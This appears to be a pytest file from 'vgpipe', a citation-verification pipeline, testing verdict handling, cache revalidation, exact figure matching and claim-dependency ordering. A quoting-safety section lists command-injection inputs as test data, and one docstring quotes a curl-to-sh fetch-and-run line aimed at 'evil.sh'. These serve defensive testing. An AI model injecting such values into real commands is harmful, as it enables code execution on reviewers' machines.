    data = _judgments_fixture(tmp_path)
    assert set(_built_unreviewed(data)) == {"https://calmatters.org/b",
                                            "https://calmatters.org/c",
                                            "https://calmatters.org/e"}
    need, _, _, blocked = _unjudged(data)
    assert (need, blocked) == (3, 0)


def test_only_a_source_with_confirmed_context_is_waiting_on_a_verdict(tmp_path):
    """The verifier judges a source from its confirmed context. A citation that failed, is
    paywalled, or was never verified has none, so counting it as needing a verdict made the
    documented gate, 0, unreachable — a verifier could judge everything it was given and never
    close it. Those are listed on their own line, still out of the count; a stale verdict among
    them is still reported as stale, as build reports it."""
    data = _judgments_fixture(tmp_path)
    _edit_claim(data, "q1", 1, status="snippet_not_found")           # b: never judged
    _edit_claim(data, "q1", 2, status="could_not_verify_paywall")    # c: stale verdict
    _edit_claim(data, "q2", 1, status="pending")                     # e: stale verdict

    assert _unjudged(data) == (0, 5, 0, 3)
    assert set(_built_unreviewed(data)) == {"https://calmatters.org/b",
                                            "https://calmatters.org/c",
                                            "https://calmatters.org/e"}
    code, out = _judgments_output(data)
    assert "2 verdict(s) predate the page they judged" in out


def test_judgments_classifies_by_what_build_revalidates_not_by_the_claim_file(tmp_path,
                                                                            monkeypatch):
    """The claim file's status is `vg verify`'s last word; build re-checks it against the cache
    and can disagree. A source build discards (its quote no longer reproduces) shows no verdict
    whatever was judged, and one whose context moved since verify loses its verdict until
    verify re-runs. Neither is a verifier's to close, so neither is in the gate — but both are
    counted, so the two lines together still add up to what build shows."""
    data = _judgments_fixture(tmp_path)
    _rewrite_page(data, "https://calmatters.org/a", "The quote is gone from this copy.")
    _rewrite_page(data, "https://calmatters.org/b", "The quote is gone from this copy.")
    _rewrite_page(data, "https://calmatters.org/d",
                  "A different lead-in. a distinctive quote from https://calmatters.org/d.")

    assert _built_unreviewed(data) == {"https://calmatters.org/a": "human_review",
                                       "https://calmatters.org/b": "human_review",
                                       "https://calmatters.org/c": "verified",
                                       "https://calmatters.org/d": "verified",
                                       "https://calmatters.org/e": "verified"}
    assert _unjudged(data) == (2, 5, 2, 3)          # c and e wait on a verdict; a, b, d can't use one

    from vgpipe import cli

    monkeypatch.setattr(cli.con, "_width", 200)     # read a table cell, so don't let it wrap
    code, out = _judgments_output(data)
    assert "unreviewed (run vg verify)" in out      # d reads as a verify job, not a judging one


def test_judgments_marks_stale_rows_and_loads_each_question_once(tmp_path, monkeypatch):
    import json

    from vgpipe import judgments

    data = _judgments_fixture(tmp_path)
    shard = data / "judgments" / "q1.json"
    raw = json.loads(shard.read_text())
    raw[0]["note"] = None                           # hand-edited, or from an older writer
    shard.write_text(json.dumps(raw))
    calls: list[str] = []
    real = judgments._read
    monkeypatch.setattr(judgments, "_read", lambda p: calls.append(p.stem) or real(p))

    code, out = _judgments_output(data)
    assert "need a verdict" in out, out
    assert sorted(calls) == ["q1", "q2"], "one load per question, not one per source"
    assert out.count("stale (was ") == 2
    assert "1 recorded verdict(s) no longer match" in out


def test_a_support_verdict_in_the_claim_file_is_not_a_verdict(tmp_path):
    """`vg build` loads claim files trusting machine fields, and `apply_to()` only ever wrote
    over them. So a `support` already in the file, written by hand, by an agent, or left from
    before verdicts moved out, rendered as judged whenever `data/judgments/` had no usable
    verdict for that source. That is the judgment pass self-certified, and it made the count
    disagree with build. `data/judgments/` is the only place a verdict comes from."""
    data = _judgments_fixture(tmp_path)
    for qid, n in (("q1", 3), ("q2", 2)):
        for i in range(n):
            _edit_claim(data, qid, i, support="supports",
                        support_note="written into the claim file")

    assert set(_built_unreviewed(data)) == {"https://calmatters.org/b",   # never judged
                                            "https://calmatters.org/c",   # page re-fetched since
                                            "https://calmatters.org/e"}   # re-extracted since
    assert _unjudged(data) == (3, 5, 2, 0)


# --- build rebuilds verification from evidence the pipeline controls --------------------


def _stamped(s, page):
    """Give `s` exactly the verification fields a `vg verify` of `page` would have written,
    so the only thing wrong with the row is whatever the test puts there."""
    from vgpipe.normalize import context_window

    start = page.text.index(s.snippet)
    excerpt, rs, re_ = context_window(page.text, start, start + len(s.snippet))
    s.verification.status = "verified"
    s.verification.match_count = 1
    s.verification.matched_offset = start
    s.verification.context = excerpt
    s.verification.context_offset = (rs, re_)
    return s


def _build_one(root, monkeypatch, s, pages):
    """Run `vg build` over a single claim file and return the claim as it reached render."""
    import json

    from vgpipe import cli

    claims_dir = root / "claims"
    claims_dir.mkdir(parents=True, exist_ok=True)
    (claims_dir / "q1.json").write_text(Claim(
        question_id="q1", question="?", answer="a", sources=[s]).model_dump_json())
    # Both lookups: revalidation reads pages through verify, the verdict check through fetch.
    for where in ("vgpipe.verify.load_cached", "vgpipe.fetch.load_cached"):
        monkeypatch.setattr(where, lambda root, url: pages.get(url))
    rendered = []

    def _render(claims, out, title, **_kw):
        rendered.extend(json.loads(c.model_dump_json()) for c in claims)
        return "review.html", "review.js"

    monkeypatch.setattr(cli, "render", _render)
    cli.build(data=root)
    return Claim.model_validate(rendered[0])


def test_a_verdict_written_into_the_claim_file_does_not_render(tmp_path, monkeypatch):
    """Verdicts live in data/judgments/, never in the claim file. `vg build` trusts the file's
    machine fields in order to re-check them, but apply_to() only overwrote sources that HAD a
    recorded judgment — so `support: supports` in a claim file (a hand edit, or a retry
    followed by build without verify) rendered as judged with no verifier having run."""
    from vgpipe import judgments

    page = _page()
    s = _stamped(src(), page)
    s.verification.support = "supports"
    s.verification.support_note = "no verifier wrote this"

    out = _build_one(tmp_path, monkeypatch, s, {s.url: page})
    assert out.sources[0].verification.status == "verified", "the citation itself is genuine"
    assert out.sources[0].verification.support == "unreviewed"
    assert out.sources[0].verification.support_note is None
    assert out.status == "pending"

    # A recorded verdict is still exactly what renders.
    judgments.record(tmp_path, "q1", s.sid, "supports", "checked by a verifier")
    out = _build_one(tmp_path, monkeypatch, s, {s.url: page})
    assert out.sources[0].verification.support == "supports"
    assert out.sources[0].verification.support_note == "checked by a verifier"
    assert out.status == "verified"


@pytest.mark.parametrize("case", ["excluded aggregator", "blog", "soft 404", "line break"])
def test_build_rechecks_everything_verify_checks(case, tmp_path, monkeypatch):
    """Build's re-check used to ask only whether the snippet was uniquely on the cached page,
    so a forged `verified` rode through wherever `vg verify` would have refused it for a
    different reason. Each row here has its snippet uniquely on its cached page and a recorded
    `supports` verdict — everything but the one rule it breaks says green."""
    from vgpipe import judgments

    page, s = {
        "excluded aggregator": (
            _page(url="https://grokipedia.com/dana-ko"),
            src(url="https://grokipedia.com/dana-ko", publisher="Grokipedia")),
        "blog": (
            _page(url="https://ballotblog.com/ko"),
            src(url="https://ballotblog.com/ko", publisher="Ballot Blog")),
        # an error page echoing the quote back: verify refuses it, but the cache still holds it
        "soft 404": (
            _page(url="https://calmatters.org/gone", status=404,
                  text="Page not found. You searched for: she opposed the Harbor Levy Act"),
            src(url="https://calmatters.org/gone")),
        # unique in the extracted text, but a human's Cmd-F cannot cross the line break
        "line break": (
            _page(), src(snippet="a burden on the port.”\n\nThe measure")),
    }[case]
    s = _stamped(s, page)
    judgments.record(tmp_path, "q1", s.sid, "supports", "fine")

    out = _build_one(tmp_path, monkeypatch, s, {s.url: page})
    v = out.sources[0].verification
    assert v.status == "human_review", f"{case}: a forged 'verified' survived build"
    assert v.context is None and v.support == "unreviewed"
    assert out.status == "human_review"
    expected = {"excluded aggregator": "bad_source_class", "blog": "bad_source_class",
                "soft 404": "fetch_failed", "line break": "line break"}[case]
    assert expected in v.reason


def test_a_forged_paywall_row_cannot_corroborate(tmp_path, monkeypatch):
    """A paywall row never renders green, so revalidation used to skip it — but
    check_corroboration() counts it as usable evidence. A hand-written paywall status on an
    excluded aggregator then stood as an adversarial claim's independent second source."""
    gate = _page(url="https://ocregister.com/x", status=403, text="Subscribe to continue reading.")
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: {
        "https://calmatters.org/a": _page(), gate.url: gate}.get(url))
    real = _stamped(src(), _page())
    forged = src(url="https://grokipedia.com/dana-ko", publisher="Grokipedia")
    forged.verification.status = "could_not_verify_paywall"
    c = Claim(question_id="q1", question="?", answer="a", claim_type="adversarial",
              sources=[real, forged])
    for s in c.sources:
        revalidate_from_cache(s, tmp_path, rules=RULES)
    check_corroboration(c)
    assert forged.verification.status == "human_review"
    assert "bad_source_class" in forged.verification.reason
    assert c.corroboration_ok is False

    # A row whose cached page is still gated stays a paywall row, rebuilt from that page: it
    # has no excerpt to draw, so one carried in the claim file is dropped, not rendered.
    honest = src(url="https://ocregister.com/x", publisher="OC Register")
    honest.verification.status = "could_not_verify_paywall"
    honest.verification.context = "an excerpt nobody could have read behind the gate"
    honest.verification.context_offset = (0, 10)
    honest.verification.reason = "a reason nothing wrote"
    v = revalidate_from_cache(honest, tmp_path, rules=RULES).verification
    assert v.status == "could_not_verify_paywall"
    assert v.context is None and v.context_offset is None
    assert v.reason == "snippet not in retrievable text; page appears paywalled or gated"

    # ...and one claiming a gate its cached page doesn't have is not a paywall row at all —
    # even where the page reads fine and holds the quote: build never promotes a row into a
    # match, it sends it back to `vg verify`.
    for snippet in ("a quote that is nowhere here", "she opposed the Harbor Levy Act"):
        open_page = src(url="https://calmatters.org/a", snippet=snippet)
        open_page.verification.status = "could_not_verify_paywall"
        assert revalidate_from_cache(open_page, tmp_path, rules=RULES).verification.status == (
            "human_review"), snippet


def test_build_renders_the_status_the_cached_page_gives_now(tmp_path, monkeypatch):
    """The page cache is shared across runs, so another run's re-fetch can change what a
    claim file's recorded status describes. Revalidation used the check only as a gate and
    kept the file's status, so a row recorded as a normalized match stayed one — warning the
    human that Cmd-F may miss — after the cached page came to match it exactly."""
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: _page())
    s = src()
    s.verification.status = "normalized_match"
    s.verification.reason = "matched only after normalizing whitespace/quotes/dashes"
    v = revalidate_from_cache(s, tmp_path, rules=RULES).verification
    assert v.status == "verified"
    assert v.reason is None


def test_an_archive_row_says_how_its_snapshot_matched(tmp_path, monkeypatch):
    """verified_via_archive keeps its status on a snapshot match, but not the file's reason:
    a hand-written one could claim anything, and dropping the normalization note would hide
    that Cmd-F in the snapshot may miss."""
    snap = "https://web.archive.org/web/2026/https://ocregister.com/x"
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: {
        snap: _page(url=snap, text="the state paid “$120,000” to settle"),
        "https://ocregister.com/x": _gated("https://ocregister.com/x")}.get(url))
    s = src(url="https://ocregister.com/x", publisher="OC Register", archive_url=snap,
            snippet='paid "$120,000" to settle')
    s.verification.status = "verified_via_archive"
    s.verification.reason = "confirmed verbatim on the live page"
    v = revalidate_from_cache(s, tmp_path, rules=RULES).verification
    assert v.status == "verified_via_archive"
    assert "confirmed verbatim" not in v.reason
    assert "matched only after normalizing" in v.reason


def test_status_does_not_need_a_race_to_summarize(tmp_path, monkeypatch, capsys):
    """`vg status` is a read-only summary. Loading the race's source lists must not make it
    raise where there is more than one race and no --race was given."""
    from vgpipe import cli

    def _ambiguous(name=None, races_dir=None):
        raise ValueError("multiple races (a, b); pass --race")

    monkeypatch.setattr(cli, "load_race", _ambiguous)
    monkeypatch.setattr("vgpipe.races.load", _ambiguous)
    claims_dir = tmp_path / "claims"
    claims_dir.mkdir()
    (claims_dir / "q1.json").write_text(Claim(
        question_id="q1", question="?", answer="a", sources=[src()]).model_dump_json())
    cli.status(data=tmp_path)
    out = capsys.readouterr().out
    assert "q1" in out
    assert "us` source list only" in out, "a narrower rule set must not be used silently"


def test_a_reproduced_query_does_not_carry_the_claim_files_evidence(tmp_path, monkeypatch):
    """Revalidating a query citation checked only that the number reproduced, then kept every
    other verification field from the claim file — so a forged `verified_via_archive` and a
    fabricated excerpt rode through under a query that happened to match."""
    from vgpipe import queries
    from vgpipe.models import QueryCitation

    monkeypatch.setitem(
        queries.REGISTRY, "test.total",
        queries.Query(lambda root, **kw: queries.QueryResult(value=45678.21, detail="57 gifts"),
                      ("filer_id",), "test", 1))
    s = src(query=QueryCitation(name="test.total", params={"filer_id": "1"},
                                expected="45678.21"))
    s.verification.status = "verified_via_archive"
    s.verification.context = "an excerpt the query never produced"
    s.verification.reason = "a reason nothing wrote"
    s.verification.support = "supports"

    v = revalidate_from_cache(s, tmp_path, rules=RULES).verification
    assert v.status == "verified"
    assert v.context.startswith("test.total(filer_id=1) = 45678.21")
    assert "re-running the query" in v.reason
    assert v.support == "supports", "the verdict is about the query, which still reproduces"


def _argv_in_a_real_shell(cmd: str, cwd: Path) -> list[str]:
    """The arguments `sh` would actually pass, with the command swapped for an argv printer.

    shlex.split alone cannot show the property that matters: it expands neither `$(...)` nor
    backticks, so it round-trips an UNQUOTED command substitution as one tidy argument — the
    old, exploitable output passes a shlex-only test. Payloads here are harmless on purpose,
    since a regression would run them.
    """
    import json
    import shlex
    import subprocess
    import sys

    prefix = "uv run vg query "
    assert cmd.startswith(prefix)
    show_argv = f"{shlex.quote(sys.executable)} -c 'import json, sys; print(json.dumps(sys.argv[1:]))'"
    out = subprocess.run(["sh", "-c", f"{show_argv} {cmd[len(prefix):]}"],
                         capture_output=True, check=True, cwd=cwd, text=True).stdout
    return json.loads(out)


@pytest.mark.parametrize("value", [
    "$(printf${IFS}INJECTED)",
    "`echo INJECTED`",
    "Ko; echo INJECTED",
    "a && echo INJECTED > out",
    "O'Brien \"PAC\"",
    "PAC *",
    "~root",
    "--data=/elsewhere",
    "",
])
def test_the_printed_query_command_passes_every_parameter_as_inert_data(value, tmp_path):
    """The review page tells a human to copy this command and run it, and every parameter is
    agent-authored. Quoting only values containing a space, and then with repr, let
    `$(curl${IFS}-s${IFS}evil.sh|sh)` through bare: code execution on the reviewer's machine,
    delivered by the verification step itself."""
    import shlex

    from vgpipe import queries

    cmd = queries.human_command("calaccess.contributor_total",
                                {"filer_id": "9990001", "contributor": value})
    want = ["--param", "filer_id=9990001", "--param", f"contributor={value}"]
    assert shlex.split(cmd) == ["uv", "run", "vg", "query", "calaccess.contributor_total",
                                *want], "each parameter must come back as one argument"
    (tmp_path / "decoy").write_text("")  # something for an unquoted * to expand to
    assert _argv_in_a_real_shell(cmd, tmp_path) == ["calaccess.contributor_total", *want], (
        "a real shell must receive the value verbatim: nothing expanded, nothing executed")
    assert not (tmp_path / "out").exists()


UNSAFE_QUERIES = [
    # Quoting cannot make a control character safe to paste: it acts on the terminal before
    # the shell parses any quote (^C abandons the line; ending a bracketed paste turns the
    # rest into keystrokes).
    *[("calaccess.contributor_total", {"contributor": f"Ko{ch}"})
      for ch in ("\n", "\x03", "\x1b[201~")],
    # Bidi, zero-width, and letters or marks that render blank: what is on screen is not what
    # is copied. U+034F and the variation selectors pass str.isprintable().
    *[("calaccess.contributor_total", {"contributor": f"Ko{ch}"})
      for ch in ("‮", "​", "\xa0", "ㅤ", "⠀", "͏", "️",
                 "\U000e0100", "\U000e0041")],
    # A name starting with '-' is an option to `vg query`, however it is quoted.
    ("--data=/elsewhere", {"filer_id": "1"}),
    ("-h", {}),
    ("x; echo INJECTED", {}),
    # `vg query` splits '--param a=b=c' at the first '=', verification did not.
    ("calaccess.filer_total", {"filer_id=1": "2"}),
    ("calaccess.filer_total", {"k`id`": "1"}),
]


@pytest.mark.parametrize("name,params", UNSAFE_QUERIES)
def test_a_query_that_cannot_be_pasted_safely_prints_no_command(name, params):
    """No real filer id, name or date needs any of these, so there is nothing to print: the
    review page shows no command rather than a dangerous one, and echoes none of the text."""
    from vgpipe import queries

    assert queries.human_command(name, params) == ""


def test_a_real_name_with_accents_still_prints_a_command():
    """The invisible-character check must not catch ordinary non-ASCII names."""
    import shlex

    from vgpipe import queries

    for name in ("Peña", "José Muñoz", "Nguyễn", "O'Brien-Smith & Co."):
        cmd = queries.human_command("calaccess.contributor_total", {"contributor": name})
        assert shlex.split(cmd)[-1] == f"contributor={name}"


def test_a_mistyped_query_name_still_lists_the_real_ones(tmp_path):
    """The charset rule must not pre-empt the more useful message for a plain typo."""
    from vgpipe import queries

    with pytest.raises(ValueError, match="known: .*calaccess.ie_total"):
        queries.run("calaccess.ie-total", {}, tmp_path)


@pytest.mark.parametrize("name,params", UNSAFE_QUERIES)
def test_a_query_citation_that_cannot_be_pasted_safely_is_refused_at_load(name, params):
    """Checked on the model, like _http_only, so no consumer of a loaded claim has to
    remember to — and `vg check-claim` fails the researcher on it."""
    from vgpipe.models import QueryCitation

    with pytest.raises(ValueError):
        QueryCitation(name=name, params=params, expected="1")


def test_an_unsafe_query_citation_built_without_validation_still_does_not_verify(
        tmp_path, monkeypatch):
    """The backstop for a citation changed after the model checked it (pydantic does not
    re-validate a mutated dict): run() refuses it too, so it cannot go green even where the
    query would ignore the stray character (`stance` keeps only its first letter) and match."""
    from vgpipe import queries
    from vgpipe.models import QueryCitation
    from vgpipe.verify import revalidate_from_cache, verify_source

    monkeypatch.setitem(
        queries.REGISTRY, "test.total",
        queries.Query(lambda root, **kw: queries.QueryResult(value=12345.0, detail="2 gift(s)"),
                      ("filer_id",), "test", 1))

    def tampered():
        s = src(query=QueryCitation(name="test.total", params={"filer_id": "1"},
                                    expected="12345"))
        s.query.params["stance"] = "O\x03"
        return s

    assert verify_source(tampered(), tmp_path).verification.status != "verified"

    claimed = tampered()
    claimed.verification.status = "verified"
    assert revalidate_from_cache(claimed, tmp_path).verification.status == "human_review"


def test_vg_query_prints_the_value_researchers_copy_verbatim(tmp_path, monkeypatch, capsys):
    """researcher.md says to record `expected` exactly as `vg query` prints it, and matching
    is now exact — so rich markup must not eat a contributor's brackets on the way out."""
    import re

    from vgpipe import cli, queries

    # markup, an emoji code, and long enough to wrap at rich's 80-column non-terminal default
    value = "Yes on [b] PAC :smile: | " + "Committee for a Very Long Name | " * 3
    monkeypatch.setitem(
        queries.REGISTRY, "test.top",
        queries.Query(lambda root, **kw: queries.QueryResult(value=value, detail="[i] 3 gifts"),
                      (), "test", 1))
    cli.run_query(name="test.top", param=[], data=tmp_path)
    out = re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out)
    assert value in out.splitlines()[0], "one line, byte for byte"
    assert "[i] 3 gifts" in out


def test_a_query_figure_must_reproduce_to_the_cent():
    """A 0.5% relative tolerance let $615,000 verify against a true $612,345.67: a figure
    wrong by $2,654.33 wearing a green badge. A query citation exists to make a number
    reproducible exactly, so figures now match to the cent and only float noise is absorbed."""
    from vgpipe import queries

    assert not queries.matches("$615,000", 612345.67)
    assert not queries.matches("612345.68", 612345.67), "a cent off is wrong"
    # 100.02 - 100.01 is 0.00999999999999 in binary floating point, so a "within one cent"
    # tolerance passes a figure that is a cent off. Half a cent does not.
    assert not queries.matches("100.02", 100.01)

    assert queries.matches("$612,345.67", 612345.67)
    assert queries.matches("612345.67", 612345.67 + 3e-9), "float noise under a cent passes"
    assert queries.matches("0.3", 0.1 + 0.2)
    assert queries.matches("12345", 12345.0)


def test_an_integer_count_matches_exactly():
    """Counts are whole numbers: '12.004' is not a count of 12, whatever the tolerance."""
    from vgpipe import queries

    assert queries.matches("12", 12)
    assert queries.matches("1,200", 1200)
    assert not queries.matches("12.004", 12)
    assert not queries.matches("13", 12)


def test_a_text_result_compares_as_text_even_when_it_looks_numeric():
    """The query's return type picks the comparison. A string that happens to parse as a
    number is still text, so it gets no dollar tolerance: '100.004' is not '100.00'."""
    from vgpipe import queries

    assert not queries.matches("100.004", "100.00")
    assert queries.matches("100.00", "100.00")
    assert queries.matches(" Quinn Halvorsen ", "quinn halvorsen")
    assert not queries.matches("about $12k", 12345.0), "an unparseable figure is a mismatch"


# --- claim status is settled last, in dependency order ------------------------------------


def _claim(qid, *sources, **kw):
    return Claim(question_id=qid, question="?", answer="a", sources=list(sources), **kw)


def _genuine(url, publisher="CalMatters"):
    """A source that reproduces on its cached page, and that page."""
    page = _page(url=url)
    return _stamped(src(url=url, publisher=publisher), page), page


def _build_all(root, monkeypatch, claims, pages):
    """Run `vg build` over these claims, one file each; return them as they reached render."""
    from vgpipe import cli

    claims_dir = root / "claims"
    claims_dir.mkdir(parents=True, exist_ok=True)
    for c in claims:
        (claims_dir / f"{c.question_id}.json").write_text(c.model_dump_json())
    # Both lookups: revalidation reads pages through verify, the verdict check through fetch.
    for where in ("vgpipe.verify.load_cached", "vgpipe.fetch.load_cached"):
        monkeypatch.setattr(where, lambda root, url: pages.get(url))
    rendered = {}

    def _render(claims, out, title, **_kw):
        rendered.update((c.question_id, Claim.model_validate_json(c.model_dump_json()))
                        for c in claims)
        return "review.html", "review.js"

    monkeypatch.setattr(cli, "render", _render)
    cli.build(data=root)
    return rendered


def test_a_downgrade_in_this_build_reaches_every_claim_derived_from_it(tmp_path, monkeypatch,
                                                                        capsys):
    """check_inputs() ran before revalidate_from_cache(), so it read q17's status as the claim
    file claimed it: q36 (derives from q17) rendered verified while q17 was downgraded to
    human_review later in the same build. It was also one pass in file order, so q9 (derives
    from q36) read q36 before q36's own inputs had been checked."""
    from vgpipe import cli, judgments

    s17, _ = _genuine("https://calmatters.org/q17")
    s36, p36 = _genuine("https://calmatters.org/q36")
    s9, p9 = _genuine("https://calmatters.org/q9")
    pages = {s36.url: p36, s9.url: p9,
             # the page changed since q17 was verified: its quote is no longer on it
             s17.url: _page(url=s17.url, text="An unrelated story about the state budget.")}
    q17 = _claim("q17", s17, corroboration_ok=True)
    q36 = _claim("q36", s36, derives_from=["q17"])
    q9 = _claim("q9", s9, derives_from=["q36"])
    for qid, s in (("q17", s17), ("q36", s36), ("q9", s9)):
        judgments.record(tmp_path, qid, s.sid, "supports", "fine")

    out = _build_all(tmp_path, monkeypatch, [q17, q36, q9], pages)
    assert out["q17"].status == "human_review", "q17's citation no longer reproduces"
    assert out["q36"].status == "human_review", "a verified row resting on a downgraded input"
    assert out["q36"].unmet_inputs == ["q17 (human_review)"]
    assert out["q9"].status == "human_review", "the downgrade must reach every step of the chain"
    assert out["q9"].unmet_inputs == ["q36 (human_review)"]

    # `vg status` promises to show what build renders, so it must settle inputs the same way.
    capsys.readouterr()
    cli.status(data=tmp_path)
    rows = {line.split()[0]: line for line in capsys.readouterr().out.splitlines()
            if line.strip().startswith("q")}
    assert "human_review" in rows["q36"] and "human_review" in rows["q9"]


def test_a_stale_corroboration_ok_does_not_carry_through_check_inputs(tmp_path, monkeypatch):
    """`corroboration_ok: true` in the claim file is from the last `vg verify`, before the
    verifier judged one of q17's two outlets topic_only — so q17 is one usable source short of
    corroborated. Checking inputs before check_corroboration() re-ran read the stale true, and
    q36 rendered verified on an adversarial input that failed corroboration."""
    from vgpipe import judgments

    a, pa = _genuine("https://calmatters.org/q17")
    b, pb = _genuine("https://sacbee.com/q17", publisher="Sacramento Bee")
    s36, p36 = _genuine("https://calmatters.org/q36")
    q17 = _claim("q17", a, b, claim_type="adversarial", corroboration_ok=True)
    q36 = _claim("q36", s36, derives_from=["q17"])
    judgments.record(tmp_path, "q17", a.sid, "supports", "fine")
    judgments.record(tmp_path, "q17", b.sid, "topic_only", "names the measure, not her position")
    judgments.record(tmp_path, "q36", s36.sid, "supports", "fine")

    out = _build_all(tmp_path, monkeypatch, [q17, q36],
                     {a.url: pa, b.url: pb, s36.url: p36})
    assert out["q17"].corroboration_ok is False
    assert out["q17"].status == "human_review"
    assert out["q36"].status == "human_review"
    assert out["q36"].unmet_inputs == ["q17 (human_review)"]


def test_check_inputs_replaces_a_stale_unmet_list():
    """unmet_inputs is recomputed for every claim, including one whose inputs are all fine now
    — a value carried in from the claim file must not outlive the check."""
    from vgpipe.verify import check_inputs

    ok = _claim("q17", _verified(), corroboration_ok=True)
    ok.sources[0].verification.support = "supports"
    cmp_ = _claim("q36", _verified(), derives_from=["q17"], corroboration_ok=True,
                  unmet_inputs=["q17 (pending)"])
    cmp_.sources[0].verification.support = "supports"
    check_inputs([cmp_, ok])
    assert cmp_.unmet_inputs == [] and cmp_.status == "verified"


def test_unmet_inputs_is_stripped_on_ingest():
    """unmet_inputs is pipeline-owned. `vg verify` loads with stripping on and writes the claim
    back, so a list an agent wrote, or one left over, would otherwise sit in the file as
    pipeline state no pipeline pass produced."""
    from vgpipe.models import strip_machine_fields

    raw = {"question_id": "q36", "question": "?", "answer": "a", "derives_from": ["q17"],
           "unmet_inputs": ["q17 (pending)"]}
    c = Claim.model_validate(strip_machine_fields(raw))
    assert c.unmet_inputs == [] and c.derives_from == ["q17"]


def test_a_derives_from_cycle_is_reported_not_looped():
    """Claims resting on each other are no foundation for any of them, and settling inputs in
    dependency order has no order to follow through a cycle. Report it and mark it unmet."""
    from vgpipe.verify import check_inputs

    def good(qid, **kw):
        c = _claim(qid, _verified(), corroboration_ok=True, **kw)
        c.sources[0].verification.support = "supports"
        return c

    q5, q6 = good("q5", derives_from=["q6"]), good("q6", derives_from=["q5"])
    q7 = good("q7", derives_from=["q5"])           # behind a cycle, not in it
    q8 = good("q8", derives_from=["q8"])           # names itself
    q9 = good("q9")

    cycles = check_inputs([q7, q5, q6, q8, q9])
    assert sorted(cycles) == [["q5", "q6"], ["q8"]]
    assert q5.unmet_inputs == ["q6 (cycle)"] and q6.unmet_inputs == ["q5 (cycle)"]
    assert q8.unmet_inputs == ["q8 (cycle)"]
    assert q7.unmet_inputs == ["q5 (human_review)"]
    assert q9.status == "verified", "a claim outside the cycle is unaffected"


def test_a_long_derives_from_chain_does_not_hit_the_recursion_limit():
    """derives_from is agent-authored; a chain longer than Python's recursion limit must still
    settle, all the way down. Every link is well cited, and each is listed before its input, so
    only the failure at the bottom — reached in dependency order — can make the top unmet."""
    import sys

    from vgpipe.verify import check_inputs

    n = sys.getrecursionlimit() + 500
    chain = []
    for i in range(n):
        c = _claim(f"q{i}", _verified(), corroboration_ok=True,
                   derives_from=[f"q{i + 1}"] if i + 1 < n else [])
        c.sources[0].verification.support = "supports"
        chain.append(c)
    chain[-1].sources[0].verification.status = "snippet_not_found"
    assert check_inputs(chain) == []
    assert chain[0].status == "human_review"
    assert chain[0].unmet_inputs == ["q1 (human_review)"]


def test_a_mechanical_failure_outranks_pending():
    """A claim waiting on a verdict reads `pending` — but the verifier never judges a source
    whose quote isn't on the page, so a claim whose only source was snippet_not_found read
    `pending` forever instead of asking for a fix. No verdict can make such a claim verified."""
    only_bad = _claim("q1", src(), corroboration_ok=False)
    only_bad.sources[0].verification.status = "snippet_not_found"
    assert only_bad.status == "human_review"
    only_bad.sources[0].verification.support = "supports"
    assert only_bad.status == "human_review", "with a verdict or without"

    # a good source alongside it doesn't change that: the failed citation still needs fixing
    mixed = _claim("q2", _verified(), src(snippet="a quote that is not there"),
                   corroboration_ok=True)
    mixed.sources[1].verification.status = "snippet_not_unique"
    assert mixed.status == "human_review"

    # ...and a source judged unsupported is no more usable than a failed one
    mixed.sources[0].verification.support = "topic_only"
    assert mixed.status == "human_review"

    # Nor does a paywalled source, or one `vg verify` hasn't reached yet: either would leave
    # the failed citation behind a yellow badge or "waiting", out of the review filter.
    for other in ("could_not_verify_paywall", "pending"):
        beside = _claim("q5", src(url="https://ocregister.com/x", publisher="OC Register"),
                        src(snippet="a quote that is not there"))
        beside.sources[0].verification.status = other
        beside.sources[1].verification.status = "snippet_not_found"
        assert beside.status == "human_review", other

    # An absence claim needs no citation, but a broken one it carries still needs fixing —
    # not a muted not_found badge. A sound one leaves not_found alone.
    absent = _claim("q6", src(), confidence="not_found")
    absent.sources[0].verification.status = "snippet_not_found"
    assert absent.status == "human_review"
    absent.sources[0].verification.status = "verified"
    assert absent.status == "not_found"

    # With nothing failed, waiting on a verdict is still `pending`.
    assert _claim("q3", _verified(), corroboration_ok=True).status == "pending"
    not_yet_run = _claim("q4", src())      # `vg verify` hasn't checked it: not a failure
    assert not_yet_run.status == "pending"


def test_every_verify_status_is_usable_failed_or_pending():
    """MECHANICAL_FAILURES is kept by hand. A new failure status left out of it would put a
    claim carrying one straight back to reading `pending` forever, so every status has to be
    classified exactly once."""
    from typing import get_args

    from vgpipe.models import MECHANICAL_FAILURES, VerifyStatus
    from vgpipe.verify import USABLE

    groups = [set(USABLE), set(MECHANICAL_FAILURES), {"pending"}]
    assert set().union(*groups) == set(get_args(VerifyStatus))
    assert sum(len(g) for g in groups) == len(get_args(VerifyStatus)), "classified twice"


def test_a_broken_absence_claim_is_not_listed_as_deliberate(tmp_path):
    """The review app lists not_found claims under "deliberate, not failure". A not_found claim
    carrying a broken citation is human_review now, so selecting that section by confidence
    put a failure under a heading telling the reviewer it isn't one."""
    from vgpipe.report import render

    broken = _claim("q7", src(), confidence="not_found")
    broken.sources[0].verification.status = "snippet_not_found"
    clean = _claim("q8", confidence="not_found")
    html = render([broken, clean], tmp_path, title="T")[0].read_text()
    section = html.split("deliberate, not failure</summary>")[1].split("</details>")[0]
    assert "<b>q8</b>" in section and "<b>q7</b>" not in section
    assert "No source found (1)" in html


# --- staleness is checked in the cache the verdict was stamped from ------------------


def _candidate_run(tmp_path):
    """A per-candidate run as `vg new-candidate` lays it out: claims and verdicts under
    data/<candidate>, the page cache shared at data/cache. One cited page, cached and verified
    before judging — `vg judgments` only gates on sources with confirmed context."""
    from datetime import timedelta

    from typer.testing import CliRunner

    from vgpipe import cli
    from vgpipe.fetch import cache_path
    from vgpipe.models import EXTRACTOR_VERSION

    data, cand, s = tmp_path / "data", tmp_path / "data" / "cand", src()
    cache_path(data, s.url).write_text(
        _page(fetched_at=datetime.now(UTC) - timedelta(hours=6),
              extractor_version=EXTRACTOR_VERSION).model_dump_json())
    (data / "questions.json").write_text("[]")
    (cand / "claims").mkdir(parents=True)
    (cand / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[s]).model_dump_json())
    res = CliRunner().invoke(cli.app, ["verify", "--data", str(cand)])   # offline: page cached
    assert res.exit_code == 0, res.output
    claim = cli.load_claims(cand / "claims", trust_machine_fields=True)[0]
    assert claim.sources[0].verification.status == "verified"
    return data, cand, s


def _refetch_shared(data, s):
